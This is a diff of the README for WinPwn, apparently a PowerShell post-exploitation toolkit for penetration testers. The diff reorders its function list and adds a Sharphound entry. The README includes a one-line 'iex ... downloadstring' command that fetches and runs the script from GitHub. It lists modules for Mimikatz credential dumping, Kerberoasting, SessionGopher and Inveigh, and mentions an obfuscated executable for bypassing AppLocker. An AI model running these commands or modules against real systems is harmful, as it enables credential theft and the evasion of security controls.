@@ -5,7 +5,7 @@ Just Import the Modules with "Import-Module .\WinPwn_v0.6.ps1" or with
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.6.ps1')
 
 Functions available after Import:
-1) #### `isadmin` -> Checks for local admin access
+1) #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
 2) #### `Inveigh` -> Executes Inveigh in a new Console window (https://github.com/Kevin-Robertson/Inveigh)
 3) #### `sessionGopher` -> Executes Sessiongopher in memory (https://github.com/Arvanaghi/SessionGopher)
 4) #### `Mimikatzlocal` -> Executes Invoke-WCMDump and Invoke-Mimikatz after with admin rights (https://github.com/PowerShellMafia/PowerSploit)
@@ -19,8 +19,8 @@ Functions available after Import:
 12) #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder from Powerview (Powersploit)
 13) #### `groupsearch` -> FindGPOLocation (Powerview / Powersploit)
 14) #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
-15) #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
-
+15) #### `isadmin` -> Checks for local admin access
+16) #### `Sharphound` -> Downloads Sharphound and collects Information for the Bloodhound DB.
 
 The "oBEJHzXyARrq.exe"-Executable is an obfuscated Version of jaredhaights PSAttack Tool for Applocker/PS-Restriction Bypass (https://github.com/jaredhaight/PSAttack).
 
